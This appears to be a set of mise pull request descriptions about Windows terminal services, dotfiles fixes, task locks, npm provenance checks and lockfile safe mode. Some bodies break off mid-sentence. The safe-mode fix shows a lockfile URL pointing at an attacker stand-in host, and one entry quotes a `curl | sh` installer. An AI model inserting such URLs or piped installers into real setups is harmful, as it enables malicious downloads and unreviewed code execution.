title: fix: keep background services alive when closing Windows Terminal
body:
mise's built-in Windows background services and environment-service launcher should not depend on keeping a Windows Terminal window open. On Windows with `AllocConsoleWithOptions`, this change releases their private Terminal console after startup and keeps the service running in an inheritable windowless console. Shared interactive shells are left alone.

Fixes #14313 on the supported API path; older-Windows limitations are described below.

## Reproduction and root cause

With Windows Terminal as the default terminal, declare the updater in your global mise config and run `mise bootstrap services apply`:

```toml
[bootstrap.services.mise-tool-update]
builtin = "tool-update"
```

Task Scheduler starts the persistent `mise __tool-update --watch` process in its own console. Before this change, its Terminal window remains open, and closing it terminates the watcher.

For a pseudoconsole, [`GetConsoleWindow`](https://learn.microsoft.com/en-us/windows/console/getconsolewindow) returns a message-only HWND, **not the visible Terminal window**. `ShowWindow(..., SW_HIDE)` therefore hides the wrong window.

- #14344 (`1882c24b1`) correctly classified `__tool-update --watch` as unattended, but retained that existing hiding mechanism.
- The related #14995 report, moved to [discussion #14997](https://github.com/jdx/mise/discussions/14997), concerned prompt-started update passes. #15038 (`6b5e5a870`) adds `CREATE_NO_WINDOW` for those child passes. It does not retroactively change the console already owned by the persistent watcher or environment-service launcher.

## Fix

Keep the existing unattended-startup hook and sole-console-client guard. For a private pseudoconsole, dynamically resolve [`AllocConsoleWithOptions`](https://learn.microsoft.com/en-us/windows/console/allocconsolewithoptions), detach from the old console, and allocate an inheritable windowless replacement **in the same process**. Ordinary console children can inherit it rather than opening another window.

Preserve file/pipe redirection and console code pages, replace invalidated console standard handles with NUL, and perform console replacement before registering signal listeners. Propagate allocation/restoration failures instead of continuing without a replacement console. Task Scheduler still tracks the original PID; service job supervision and full-width exit status are unchanged.

## Compatibility and design tradeoff

- The replacement API requires Windows 11 24H2 / Windows Server 2025 or later. Dynamic lookup preserves startup compatibility; unavailable-API systems retain the old hiding behavior, which can still leave Windows Terminal visible. Classic Console Host continues using `ShowWindow`.

title: fix(task): suggest list for a mistyped list instead of a hidden command
body:
A mistyped command could be "corrected" to an internal one. Fixes #15257.

Before:

```
$ mise lsit
mise ERROR unknown command: lsit

Did you mean:
  mise __publish-system-install
```

The suggestions came from a subsequence match, and `lsit` happens to be a subsequence of that hidden command's long name, while it is not one of `list`.

After, `mise lsit` suggests `mise list`. Close spellings (transposed or missing letters) are ranked first by edit similarity, the old subsequence match only fills the remaining slots, and hidden commands (`__publish-system-install`, `hook-env`, ...) are never suggested, and a close command name no longer hides a non-executable task file that mise can offer to make executable.

Validated with a new unit test (`lsit` ranks `list` first and with hidden commands filtered out), `cargo clippy -p mise --all-targets -- -D warnings`, and `cargo fmt`. I did not run the built binary against `mise lsit`.

title: fix(backend): run the prerelease a latest request resolved to
body:
A tool requested as `latest` with `prerelease = true` now runs the newest installed release, prereleases included. Before, mise installed the prerelease but kept running the older stable release.

```toml
[tools."github:openai/codex"]
version = "latest"
prerelease = true
```

With `0.166.0` and `0.167.0-alpha.3` installed:

```text
# before
$ codex --version
codex-cli 0.166.0

# after
$ codex --version
codex-cli 0.167.0-alpha.3
```

This affects `mise x`, PATH from `mise activate`/`mise env`, `mise which`, `mise where` and `mise bin-paths`, for any backend.

### Cause

The generated `installs/<tool>/latest` link always names the newest **stable** install. Two places used it for requests it doesn't describe:

- Resolving `latest` against installed versions returned the link's target even when the request includes prereleases. Now the link answers only requests that leave prereleases out. Otherwise mise picks from the installed versions with the existing installed-version ordering.
- Even when a request resolved to the prerelease (from a lockfile, say), the runtime path still went through the `latest` link to the stable install. Now a runtime link (`latest`, `20`, …) goes on PATH only when it names the installation that was resolved. Otherwise mise uses that installation's own directory. This also covers a fuzzy link that is stale mid-upgrade, before runtime symlinks are rebuilt.

The `latest` link itself still skips prereleases, and a plain `latest` request still runs through it.

### Tests

- New e2e `e2e/cli/test_latest_prerelease_runtime` uses the local dummy plugin with `2.0.0` and `2.1.0-alpha.1` installed. It checks that the link stays on `2.0.0`, that `where`/`which`/`x`/`bin-paths` use the alpha with `prerelease = true`, and that plain `latest` still uses the link.
- New npm unit test for a prerelease request with a stable `latest` link. The existing stale-link `runtime_path` test now expects the resolved install.

Fixes #15256

title: fix(task): accept Windows-only tasks in tasks validate on other platforms
body:
`mise tasks validate` reported a task that runs only on Windows as having no command when you validated it on macOS or Linux:

```toml
[tasks.win_only]
run_windows = "echo hi"
```

```
✗ win_only: Task has no executable content [no-execution]
  Task must have either 'run', 'run_windows', 'file', or 'depends' defined
```

The check looked only at the command for the platform mise was running on. It now looks at both `run` and `run_windows`, so this task validates on every platform, as does `run = []` beside a `run_windows`. `mise run win_only` still does nothing outside Windows, as before.

A task with no command on any platform still fails `no-execution`: no `run`, `run_windows`, `file` or `depends`, or only empty lists such as `run = []` alone or `run = []` with `run_windows = []`.

The e2e test `e2e/tasks/test_task_validate` covers the passing and failing shapes.

Fixes #15255

title: fix(dotfiles): keep one state file when a Windows path changes letter case
body:
Windows paths ignore letter case, but mise names a dotfile entry's state file after a hash of the path as spelled in the config. Respelling a target (`.../case-target` to `.../Case-Target`) and applying again wrote a second state file beside the first, and the old one was never cleaned up (#15241, P6).

On Windows, when no state file exists for an entry's current spelling, mise now uses one recorded under another casing of the same paths. It reads the recorded paths in the current spelling, so links the entry already owns are matched as its own, not pruned as stale. This covers `symlink-each` link records and the per-target record kept for single-file entries (template content and the directories mise created). Paths are compared the way Windows compares file names (`CompareStringOrdinal`), not by Unicode lowercasing, so names Windows keeps apart (the Kelvin sign and `K`) stay apart. A link made under the old spelling still counts as the entry's own, even once its source file is gone. Other platforms are unchanged: there, paths that differ in case are different files.

State files stay where they are: the file name scheme is unchanged, so existing records need no migration. A duplicate that an older mise already wrote stays on disk, but mise ignores it.

## Validation

- New Pester cases in `e2e-win/dotfiles_symlink_each_links.Tests.ps1`. A `symlink-each` case: apply, respell the target in upper case, add a source file, apply again. It checks for a single state file, both links in place, and a clean unapply. A single-file `content` case: respell the target, then check that one record remains and unapply clears it. Both **run on Windows 11** (jdx-win-ci, elevated) and pass here. On `main` the `symlink-each` case fails with `Expected 1, but got 2` state files. The single-file case was not run against `main`. Windows clippy with `-D warnings` passes, and so do the mise-util `file::` unit tests.
- Linux: `cargo clippy -p mise -p mise-system --all-targets -- -D warnings` and the `files::` unit tests pass. The new matching is behind `cfg!(windows)`, so on Linux it only type-checks.

title: fix(dotfiles): let the next apply carry on after a failed one
body:
When `mise dot apply` failed partway through an entry, the next apply was blocked until you ran `mise dot recover` (#15241, P5 and P7). The failure is an ordinary error, not a crash, but mise left the entry's history record looking like an interrupted write:

```text
mise WARN  history: could not finish the operation record: interrupted file recovery needs attention; temporary recovery data was retained. ...\target\a.txt: write completion was not recorded...
mise ERROR cannot link ...\target\sub\b.txt to ...\source\sub\b.txt; ...
```

Two triggers from the report:

- **P7**: a `symlink-each` apply links `a.txt`, then cannot link `sub\b.txt` (a read-only directory, a full disk, a file held open). `a.txt` stayed linked, the state file did not list it, and history kept an unfinished record.
- **P5**: on Windows with `dotfiles.windows_symlinks = true` and no symlink permission, a target under a missing parent created that parent, then failed the link check. The empty parent stayed behind along with the unfinished record.

Now, when an entry's apply fails:

- paths the apply created, and mise's own state records, are marked finished as the failure left them. The operation then ends normally, and the next apply goes ahead without `mise dot recover`. A path that existed before stays unfinished, for example a file a `--force` write removed and then failed to replace, so recovery keeps its original content and asks, as before. If the partial link record can't be written, nothing is marked finished;
- links a `symlink-each` entry made before the failure are recorded in its state file, so `mise dot unapply` and stale-link pruning know they are mise's. The state file is written atomically, so a failed write cannot leave the existing record unreadable;
- directories the apply created, on the way to the target and beneath it, are removed again if still empty;
- if a single-file entry's failed write leaves a target behind, the directories mise created for it are recorded, so unapply removes them with it.

On Windows, the symlink permission check now runs before any parent directory is created, so the P5 case changes nothing on disk. Links made before a failure are kept rather than rolled back: the next apply finishes the entry.

A process killed mid-write still leaves an unfinished record for `mise dot recover`, as before.

## Validation

- New e2e `e2e/cli/test_dotfiles_failed_apply` (Linux): a read-only `target/sub` makes a `symlink-each` apply fail after one new link. It checks that no history record is left pending, that unapply removes the new link, and that the next apply succeeds. It fails on `main` (`expected '0' but got '1'` pending records) and passes here. It skips as root, which writes through the read-only directory.
- New unit test `a_failed_apply_removes_only_the_empty_dirs_it_created`.
- New Pester suite `e2e-win/dotfiles_failed_apply.Tests.ps1`, the reporter's P7 repro using an `icacls` deny ACE: **run on Windows 11** (jdx-win-ci, elevated). It

title: fix(dotfiles): report a Windows symlink that fell back to a copy as copied
body:
On Windows, a `symlink` entry for a file copies the file when Windows refuses a symbolic link (no Developer Mode, not elevated, and `dotfiles.windows_symlinks` off). mise still reported a link, so nothing told you the target would not follow its source (#15241, P4):

```text
# before: the target is a regular file
mise files: created symlink D:\...\target -> D:/.../source/file.txt
# after
mise files: copied D:/.../source/file.txt to D:\...\target: Windows refused a symlink, so the copy does not follow its source (to link it, turn on Developer Mode and dotfiles.windows_symlinks, then run `mise dot apply --force "D:\...\target"`, which replaces the copy)
```

`mise dot status` points it out too. Status only sees the file, not why it is there, so it says what is on disk: an applied entry is listed as `applied (a regular file, not a symlink)` instead of being folded into the up-to-date count, and once the source changes the row reads `differs (content differs; a regular file, not a symlink)`. `--json` carries the same text in `reason`. What lands on disk is unchanged: refreshing the copy after the source changes still needs `--force`, as the Windows docs describe.

### P1 follow-up: native directory symlinks

The reporter found that unapplying a `symlink` entry whose target is a native directory symlink failed with "access denied". #15248 already fixed this: unapply removes any symlink or junction by handle. This PR adds a Pester case for it, since #15248's tests only covered junctions.

## Validation

- New Pester suite `e2e-win/dotfiles_symlink_fallback.Tests.ps1` covers the copy fallback. It runs only on a runner that **cannot** create symlinks. jdx-win-ci has Developer Mode on and runs elevated, and so do GitHub's hosted runners, so it was skipped there and has **not run on Windows**.
- New case in `e2e-win/dotfiles_dir_links.Tests.ps1` (native directory symlink unapply): **run on Windows 11** (jdx-win-ci, elevated, Developer Mode on). It passes on this branch, and also on `main`, which confirms #15248 already fixed it.
- Windows: `cargo clippy -p mise -p mise-system --all-targets -- -D warnings` passes on jdx-win-ci with this PR and the sibling #15241 fixes merged together. The other Windows dotfiles suites (`dotfiles_dir_links`, `dotfiles_conflicts`, `dotfiles_symlink_each_links`) pass too.
- Linux: `cargo clippy -p mise -p mise-system --all-targets -- -D warnings` passes. The Windows-only branches use `cfg!(windows)`, not `#[cfg]`, so the Linux build type-checks them.

title: fix(dotfiles): prune symlink-each links on Windows after the state file is lost
body:
Two Windows `symlink-each` fixes for entries that hold links (`dotfiles.windows_symlinks = true`), from #15241 (P2 and P3).

### A lost state file no longer orphans a dangling link

mise records the links each `symlink-each` entry made in a state file. When that file is missing (deleted, or a write that only warned failed), apply falls back to scanning the target for links into the source. Windows skipped that scan, so after a source file was deleted:

- `mise dot status` said the entry was up to date,
- `mise dot apply` said "all files are applied", left the dangling link, and wrote a state file with `links = []`,
- `mise dot unapply` then exited 0 and left the link too.

The scan now runs on Windows whenever `dotfiles.windows_symlinks` is on, so apply removes the dangling link and records the right state. With the setting off `symlink-each` copies every file, so there is nothing of mise's to find and the scan stays off.

### Output after turning the setting off

Links made with the setting on stay links after it is turned off, but apply counted them as copies:

```text
# before: old.txt is still a link, only new.txt was copied
mise files: copied 2 file(s) from ...\source to ...\target
# after
mise files: copied 1 file(s) and linked 1 from ...\source in ...\target
```

Only the message changes; what lands on disk was already right.

## Validation

- New Pester suite `e2e-win/dotfiles_symlink_each_links.Tests.ps1` covers both. It skips on a runner that cannot create file symlinks.
- **Run on Windows 11** (jdx-win-ci, elevated): both pass with this change. Against `origin/main` both fail: the dangling link stays, and the output says `copied 2 file(s)`.
- Linux: `cargo clippy --workspace --all-features --all-targets -- -D warnings` and the `files::` unit tests pass.

title: fix(dotfiles): unapply junctions and directory symlinks on Windows
body:
On Windows, `mise dot unapply` failed with "access denied" (os error 5) on any target that is a directory link, and left the link in place:

- a `symlink` entry with a directory source, whose target is a junction, or a directory symbolic link when `dotfiles.windows_symlinks` is on;
- a `symlink-each` entry whose source contains a directory link, which puts a junction in the target. Here unapply stopped partway: links before the junction were already gone, the junction and everything after it stayed.

```text
mise ERROR failed rm: D:\...\test-target\linkdir
mise ERROR Access is denied. (os error 5)
```

Unapply removed every link with `remove_file`, which Windows refuses for a junction or directory symlink. It now removes links the same way apply already does when it replaces one, so all of these unapply cleanly and the directory the link pointed at is untouched. The same fix applies when `apply` removes a stale `symlink-each` directory link, which failed the same way: after its source was deleted, or when an entry that held it was removed or retargeted.

Reported in #15241 (P1 and its follow-up).

## Validation

- New Pester suite `e2e-win/dotfiles_dir_links.Tests.ps1`: unapply of a `symlink` junction target, unapply of a `symlink-each` entry holding a junction, and pruning a stale junction.
- **Run on Windows 11** (jdx-win-ci, elevated, so file symlinks work): all three pass with this change, alongside the existing `dotfiles` and `dotfiles_conflicts` suites. Against `origin/main` all three fail with "Access is denied. (os error 5)".
- Linux: `cargo clippy --workspace --all-features --all-targets -- -D warnings` and the `files::` unit tests pass.

title: docs(dotfiles): say that Windows symlink-each copies need --force once the source changes
body:
The Windows section of the dotfiles docs said that a `symlink-each` entry, which copies each file on Windows unless `dotfiles.windows_symlinks` is on, picks up source edits on the next `mise dot apply`. It doesn't: once the source changes, apply refuses to overwrite the old copy and asks for `--force`.

```text
mise ERROR files: refusing to overwrite existing files (use --force):
  D:\...\test-target\file.txt
```

That refusal is deliberate. Since #11981 a regular file where a link belongs is a conflict on Windows as on unix, because mise cannot tell its own stale copy from one you or an application edited, and overwriting it silently would lose those edits. #14682 kept that behavior with the setting off. The sentence in the docs came from the docs rewrite, not from that design, so this fixes the docs, not the code.

The Windows section now says what happens and what to do instead:

- `mise dot apply --force <target>` refreshes one entry's copies,
- `mode = "copy"` suits files apply should always overwrite,
- `dotfiles.windows_symlinks = true` makes the targets real links that follow the source.

Reported in #15241 (P0).

## Validation

- New Pester test in `e2e-win/dotfiles_conflicts.Tests.ps1` pins the behavior: apply copies, a changed source makes the next apply refuse and keep the old content, and `mise dot apply --force <target>` refreshes it. **Run on Windows 11** (jdx-win-ci): passes.
- The existing `symlink_each_also_treats_an_unmanaged_file_as_a_conflict` unit test already covers the conflict rule on every platform.

title: fix(dotfiles): skip bootstrap history checkpoints when nothing changed
body:
`mise bootstrap` recorded a `bootstrap-before` and a `bootstrap` history checkpoint on every run, even when nothing changed. In the reporter's history 448 of 474 bootstrap checkpoints had the same tree as the one before, and recording them was about 0.55s of a 0.87s no-op run.

Now a bootstrap run records nothing new when its tree equals the newest checkpoint's:

- `bootstrap-before` is skipped, and the operation's `before` points at that existing checkpoint, so undo and rollback still have their restore point.
- The `bootstrap` outcome is skipped when the run succeeded and its journal is empty. Failed runs and runs that wrote anything are still recorded.

```
mise bootstrap --yes --only dotfiles   # nothing changed
mise bootstrap dotfiles history        # no new entries
```

Fixes #15245

title: feat(task): add lock so runs that share a resource take turns
body:
When several agents or terminals run the same tasks at once in separate worktrees, they collide on resources that exist only once on the machine: a test database the suite doesn't namespace, a hard-coded port, a simulator, a GPU. Tests then fail for reasons unrelated to the code. Until now the only workaround was wrapping a command in `flock(1)`. That only works on Unix, doesn't say who holds the lock, keeps a `--jobs` slot while it waits, waits even for tasks that would be skipped, and deadlocks when a locked task runs another task with the same lock.

A task can now name the resources it needs with `lock`. Runs that need a lock another run holds wait for it:

```toml
[tasks.test]
run = "pytest"
lock = "test-db"

[tasks."e2e:ios"]
run = "./scripts/e2e-ios.sh"
lock = ["ios-simulator", "test-db"]

[tasks.migrate]
run = "./scripts/migrate.sh"
lock = true # one run at a time across every worktree of this repository
```

```text
[test] waiting for lock test-db, held by test in ~/src/shop-pr-42 (pid 4121, for 3.0s)
[test] got lock test-db after 2.1s
```

- **Names**: a string name is shared by every task on the machine that uses it, in any project. `lock = true` locks the task within its repository: all worktrees of the repository share the lock, and other repositories are unaffected. `false` or `[]` turns off a lock set by a template.
- **When the lock is taken**: after dependencies, `skip_if`, fresh `sources`, confirmation, cache restores and secret resolution, just before the first command. A task that is skipped or restored never waits. Its locks are held until its last command ends, including tasks that its `run` entries start, and are released however the task ends. Multiple names are taken in sorted order, so two runs can't deadlock on each other.
- **Slot and terminal**: a task takes its locks, its `--jobs` slot and its share of the terminal together, all or none, and keeps them until it ends. Tasks started by its `run` entries run under that slot and don't take one of their own. If the locked task isn't `interactive`, it shares the terminal, so those tasks can't prompt for secrets, and an interactive task started that way fails with an error asking for `interactive = true` on the locked task. While it waits for a lock it holds neither the slot nor the terminal, so other tasks keep going; while it waits for either of those it holds no lock. A run holding a lock therefore never waits for something another task in the run is holding while that task waits for the lock. Two tasks in the same `mise run` that name the same lock run one after the other.
- **Nested runs**: held locks are exported in `MISE_TASK_LOCKS`. A nested `mise run` or a `{ task = ... }` entry treats those locks as already held, so it doesn't wait on its own parent; this also holds under `deny_env`. A nested task can add locks of its own only if they sort after the ones it inherits. Otherwise it fails and asks for the lock to be added to the parent, so two runs can never each hol

title: feat(npm): verify the provenance of an npm tool's own package
body:
**Draft: blocked on an aube release.** This integrates [aubepkg/aube#1900](https://github.com/aubepkg/aube/pull/1900), which is merged but not yet in a release, through a temporary `[patch.crates-io]` pinned to its merge commit. Drop that block once an aube release has it. CI may reject the git dependency until then. It builds on #15239 (the `mise-sigstore` digest entry point), which has merged.

For [#15233](https://github.com/jdx/mise/discussions/15233): `npm:` tools get no signature verification today, although many npm CLIs publish Sigstore-signed SLSA provenance. aube's `trustPolicy` only checks the shape of that metadata, never the signed bundle.

With the new setting on, `mise install` verifies the provenance npm publishes for the tool's own package:

```toml
[settings.npm]
provenance = true
```

```
mise install npm:@sigstore/bundle@3.1.0
# fails if the attestation does not verify against the sha512 integrity the install locks
```

The attestation's subject must equal the sha512 integrity aube pins for the package, which aube checks every tarball against before extracting it, so the attestation covers the installed bytes. A package that publishes no provenance, and a private registry that serves none, install as they do with the setting off. The `provenance` category of `paranoid` turns it on too. Only the embedded aube package manager supports it, and dependencies are not checked.

## Not in this PR

- Recording the verified repository in `mise.lock`, and pinning a repository from the registry.
- Requiring the GitHub Actions issuer (`https://token.actions.githubusercontent.com`) on the source repository; see the open thread on #15239.
- Authenticated and private registries; only the public registry is queried.
- An e2e test that the `provenance` paranoid category works alone. It needs a published package and network.

Unit tests cover the sha512 and URL handling; the verification itself is covered on #15239. clippy with `-D warnings` and `mise run lint` are clean. The full suite has not been run on this branch.

title: refactor(core): verify GitHub attestations against a bare sha512 digest
body:
This is groundwork for verifying npm provenance (discussion [#15233](https://github.com/jdx/mise/discussions/15233)); it changes no behavior today.

An npm lockfile records only the sha512 `integrity` of a tarball, not the tarball itself, and aube already checks every tarball against that value before extracting it. To verify an npm package's Sigstore provenance without downloading it a second time, `mise-sigstore` needs to verify an attestation against a bare digest. Its crate-internal verifier already accepts one, so this adds a public entry point:

```rust
mise_sigstore::verify_github_attestation_sources_for_sha512(
    &sha512_bytes, // the 64 raw bytes behind `sha512-...`
    &attestations, // e.g. the `{"attestations": [{"bundle": ...}]}` npm returns
    None,
)
```

It returns the `owner/repo` each verified attestation vouches for, like `verify_github_attestation_sources`, and rejects a digest that is not 64 bytes. A verified attestation must name exactly that digest as its subject.

Nothing calls it yet. The caller is a provenance verifier for `npm:` tools, which needs aubepkg/aube#1900 (a hook that lets mise verify packages inside an aube install) to be released and embedded first.

Unit tests cover the empty, wrong-length and unverifiable inputs. A fixture of a real npm package (`@sigstore/bundle@3.1.0`, its attestations response) is verified against that package's `dist.integrity` and names `sigstore/sigstore-js`; a digest with one bit flipped is rejected. clippy with `-D warnings` and `mise run lint` are clean.

title: fix(task): run every line of a multi-line script under cmd.exe on Windows
body:
On Windows, a task whose `run` (or `run_windows`) script spans several lines ran only its first line and exited 0, so later commands (assertions, teardown) were silently skipped.

```toml
[tasks.probe]
run = """
echo alpha
echo beta
"""
```

Before: `mise run probe` printed `alpha` only. After: it prints `alpha` and `beta`, and a later `exit /b 3` fails the task.

The cause is that `cmd /c` stops reading its command text at the first newline. mise now joins the lines of a multi-line script with a bare `&` (no surrounding spaces, so `set X=1` keeps its value) inside the same `cmd /s /c "..."` command line. The script stays an inline command, so the shell's flags (`cmd /v:on /c`), `for %i` syntax, encoding and `call` behavior are all as for a single-line script. A script with no line break is passed through untouched. This also applies to multi-line hooks run through cmd.

How lines are joined:
- Blank lines and `rem`/`::` comment lines are dropped.
- A line ending in an odd number of `^` continues onto the next (`^^` is an escaped caret).
- Parenthesized blocks (`if x (` ... `) else (` ... `)`) stay valid: no `&` goes after a `(` or before a `)`.

Limitations: each line runs regardless of the previous one's exit code (use `|| exit /b 1`), and `%VAR%` is expanded once for the whole script, so a `set X=1` is not visible to `%X%` on a later line.

Fixes #15231

## Validation

- Unit tests for the line joining in `mise-util` (`cargo test -p mise-util`) and clippy pass on Linux.
- The Windows-only path could not be compiled locally (no mingw toolchain), so CI builds it first. `e2e-win/task_multiline_cmd.Tests.ps1` (every line runs, `for` syntax kept, later exit code propagates) has not been run yet.

title: fix(daemons): use mise's pitchfork for status, stop, logs and prune without a project pin
body:
`mise daemons status`, `stop`, `logs`, `prune` and `tui` failed when the project did not pin pitchfork in `[tools]`, even though `mise daemons start` had just installed it:

```
mise ERROR No version is set for shim: pitchfork
Set a global default version with one of the following:
mise use -g pitchfork@2.32.4
```

Only `start` added the pitchfork mise installs to the daemon toolset; the other subcommands left it out, so `PATH` fell back to the version-less `pitchfork` shim. The toolset now always includes pitchfork when the project doesn't pin it, so every `mise daemons` subcommand (and daemon startup from `mise run`) uses the same pitchfork without a `[tools]` entry. No more workaround of pinning `pitchfork = "2.32.4"`.

Tested by hand with the repro from the discussion (a project with only a `[daemons.*]` entry): `start`, `status` and `stop` all work. No e2e test added; the existing daemons e2e tests pin a fixture pitchfork in `[tools]`.

Fixes discussion https://github.com/jdx/mise/discussions/15232

title: fix(lock): never trust a project lockfile in safe mode
body:
`MISE_SAFE=1` is meant to keep a project's files from choosing where tools are downloaded from. A project's `mise.lock` still could: when the project counted as trusted, which CI does automatically and an earlier `mise trust` does anywhere, safe mode kept the lockfile's artifact `url`s and conda packages.

```toml
# mise.toml
[tools]
"github:mvdan/sh" = "3.10.0"
```

With `url = "http://attacker.example/shfmt"` under that tool in `mise.lock`, `MISE_SAFE=1 mise install` downloaded from that URL. It now downloads from the backend's own release, as it does for an untrusted project.

`lockfile_is_trusted` now returns false for every lockfile except the global and system ones when safe mode is on. The tool-stub path in `read_lockfile_for_source`, which trusted a stub's config directly, is gated the same way. The check in `may_write_through_symlink` is now redundant and was removed.

## Locked mode

A lockfile that is not trusted keeps its checksums but loses its URLs, and `--locked` refused that ("No lockfile URL found"). So `MISE_SAFE=1 mise install --locked` could not use a project lockfile at all, and an untrusted project could not either. Locked mode now accepts an entry that pins a checksum without a URL, resolves the URL from the backend (aqua, github, including supplemental assets) and verifies the download against the checksum. A wrong checksum still fails the install.

## Test plan

- New e2e `lockfile/test_lockfile_safe_mode_trust`: a trusted project with a locked URL fails to install outside safe mode (control) and installs from the backend under `MISE_SAFE=1`; locked installs work for github and aqua tools and reject a bad checksum. The first part fails without the fix.
- `backend/test_github_additional_assets` gains a safe-mode `--locked` install of a supplemental asset.
- Unit tests and the existing lockfile and trust e2e tests pass.

Reported by Serhii Shunko (@ccsimplyspolit).

* **New Features**
  * Locked installs can use checksum-pinned artifacts when their URLs are missing from the lockfile, including supported GitHub and aqua-backed tools.
  * Safe-mode locked installs can restore supported additional GitHub assets when their checksums are available.
* **Bug Fixes**
  * Safe mode rejects untrusted project lockfiles while allowing checksum-pinned installs that meet trust requirements.
  * When checksum algorithms differ, the downloaded artifact is verified against the existing checksum before it is replaced.

title: registry: add kotlin-toolchain (http:kotlin-toolchain)
body:
Adds a `kotlin-toolchain` shorthand for [Kotlin Toolchain](https://kotlin-toolchain.org), JetBrains' command-line tool for building, running and testing Kotlin JVM, Android, iOS and multiplatform projects from declarative `project.yaml`/`module.yaml` configuration. It is the renamed continuation of Amper: `JetBrains/amper` is archived after 0.10.0, and the same artifacts continue as `kotlin-cli` 0.11.0+.

```sh
mise use kotlin-toolchain@0.13
kotlin --version
# Kotlin Toolchain version 0.13.0 (abc7a5f, 2026-10-01)
```

## How it installs

The GitHub releases of `JetBrains/kotlin-toolchain` have no assets, so this uses `http:`. The entry installs the same `kotlin` wrapper script that the official installer (`curl -fsSL https://kotl.in/install.sh | sh`) puts on PATH, from the JetBrains Maven repository:

- `url`: `…/org/jetbrains/kotlin/kotlin-cli/{{ version }}/kotlin-cli-{{ version }}-wrapper` (`-wrapper.bat` on Windows)
- `checksum_url`: the `.sha256` published next to each wrapper
- `version_list_url`: the artifact's `maven-metadata.xml`, with `version_regex` keeping only `X.Y.Z` releases. The file also lists hundreds of `0.14.0-dev-*` builds, which are excluded.

The wrapper pins its distribution version and the sha256 of the distribution. On first run it downloads that distribution and a Zulu JRE into the user cache (`~/Library/Caches/JetBrains/Kotlin/cli` or `~/.cache/JetBrains/Kotlin/cli`), as it does with the official installer. Like the official install, a project that commits its own `./kotlin` wrapper next to `project.yaml` runs at that project's pinned version.

Note: the executable is named `kotlin`, which is also one of the bins of the existing `kotlin` (compiler) entry. If a config activates both tools, whichever comes first on PATH wins. This matches what happens when both are installed upstream's way.

## Popularity

- GitHub: [JetBrains/kotlin-toolchain](https://github.com/JetBrains/kotlin-toolchain) has 498 stars and 34 forks. The repo was created 2026-05-11, and 0.13.0 was released 2026-10-01 (6 stable releases since 0.11.0).
- Predecessor: [JetBrains/amper](https://github.com/JetBrains/amper) has 1.7k stars and 52 forks (archived; last release 0.10.0 on 2026-03-31).
- Official JetBrains/Kotlin tooling, distributed through SDKMAN (`kotlintoolchain`), an IntelliJ IDEA plugin, and `kotl.in/install.sh`.

## Validation

With a debug build on macOS arm64:

- `mise ls-remote kotlin-toolchain` lists `0.11.0 … 0.13.0`, and `mise latest kotlin-toolchain` returns `0.13.0`
- `mise test-tool kotlin-toolchain` passes
- `mise install kotlin-toolchain@0.11.0` installs and verifies the checksum
- `taplo fmt --check` passes, and so does `taplo check` against `schema/mise-registry-tool.json`

The Windows `.bat` platform entries were not tested locally.

title: fix(lock): remember the install identity of a uv.lock sidecar between runs
body:
`mise hook-env` re-parsed every `uv.lock` sidecar on each full run to compute the install identity of `pypi:` and `pipx:` tools. With a few locked tools that was about 320 ms of the 395 ms reported in #15229, on every prompt that needed a full run.

The identity is now remembered by the digest of the sidecar text, in the process and under `$MISE_CACHE_DIR/uv-install-identity/`. The sidecar is still read and checked against the digest in `mise.lock`, so an edited graph falls back to the old path and is never answered from the cache. A run after the first only hashes the file instead of parsing it.

Fixes #15229

## Testing

`cargo test --lib uv_install_identity` (extended the sidecar test to cover a repeated lookup and an edited sidecar). I did not time `hook-env` against the reporter's config. Only the unit tests for this module were run, not the full suite.

title: fix(mas): treat an empty mas list as unknown while App Store apps exist
body:
`mise bootstrap packages apply` reinstalls every declared Mac App Store app when Spotlight is rebuilding its index, as it does after a macOS update. `mas` finds installed apps through Spotlight, so `mas list` comes back empty in that window, and mise read the empty list as every `mas:` package being missing. It then ran `mas install` for all of them: on my machine that reinstalled Xcode in full after the macOS 27.2 update, and failed for apps no longer sold in the App Store:

```
mise ERROR mas install failed: Warning: Found a likely App Store app that is not indexed in Spotlight in /Applications/Xcode.app
         Indexing now; will likely complete sometime after mas exits
...
Error: No apps found in the App Store for ADAM ID 409183694
```

With this change, when `mas list` returns no apps but `/Applications` (or a folder directly inside it) holds an app with an App Store receipt (`Contents/_MASReceipt/receipt`, the same signal `mas` uses for that warning), mise stops with an error saying Spotlight is probably still indexing, instead of reinstalling everything. A machine with no App Store apps installed, such as a fresh one being bootstrapped, still installs as before.

This covers an empty index. A partially rebuilt index, where only some apps are missing from `mas list`, still reads those as missing; telling that apart would need mapping receipts to ADAM IDs, which `mas` does not expose.

The system checks for purchase receipts in Applications folders, including linked folders, and reports that Spotlight may still be indexing when receipts are found. This helps explain why requested apps may not yet appear in the listing.

title: fix(vfox): stop re-running embedded plugins' env hook on every prompt
body:
With an embedded vfox plugin such as gcloud, every full `mise hook-env` run (every shell prompt with `mise activate`) ran the plugin's `EnvKeys` hook again instead of reading its cached result. For gcloud on macOS that hook probes for Python, so with `CLOUDSDK_PYTHON` unset each prompt took about twice as long (60 ms against 30 ms in the report). Writing the tool as a table, `gcloud = { version = "586.0.0" }`, ran the hook twice per prompt.

Now the result is cached as intended. With the issue's repro on Linux (`gcloud = "586.0.0"`, `mise install`, then three `MISE_LOG_LEVEL=trace mise hook-env` runs), the exec_env cache trace lines were:

```
before:  run 1 writing   run 2 writing   run 3 writing
after:   run 1 reading   run 2 reading   run 3 reading
```

The table form now writes once on a cold cache and reads after that, instead of writing twice every run.

A cached result is also dropped when an environment variable the hook read changes. Some embedded hooks depend on one: gcloud reads `CLOUDSDK_PYTHON` and never overrides a value you set, pipenv reads `PWD` to find a `Pipfile`, and poetry reads `MISE_PROJECT_ROOT`. So exporting or unsetting `CLOUDSDK_PYTHON` takes effect at the next prompt, and pipenv's virtualenv doesn't follow you into another directory. Filesystem vfox plugins, which were already cached, get the same check.

## Cause

- The cache is fresh only while it is newer than each of its "fresh files", and a fresh file that doesn't exist counts as just changed. One of them was the plugin's directory under `plugins/`, which an embedded plugin doesn't have, so the cache was never fresh. It now watches the plugins directory, plus the plugin's own directory (or a link to it, even a dangling one) when there is one, so installing, linking or removing a filesystem override still invalidates it. An embedded plugin's own code only changes with the mise version, which is already part of the cache file name.
- Inline table options make `backend::get` build a new backend for every lookup, and each backend kept its own in-memory cache, so the `PATH` lookup and the env lookup each ran the hook. The caches are now shared across backends, keyed by cache file. The key also includes the raw version, since refs such as `ref:a/b` and `ref:a-b` share an install path.

## Plugins can say what their result depends on

mise can't see the files a hook opens or the commands it runs. A hook can now name the files its result depends on, and mise runs it again when one of them changes, appears or goes away:

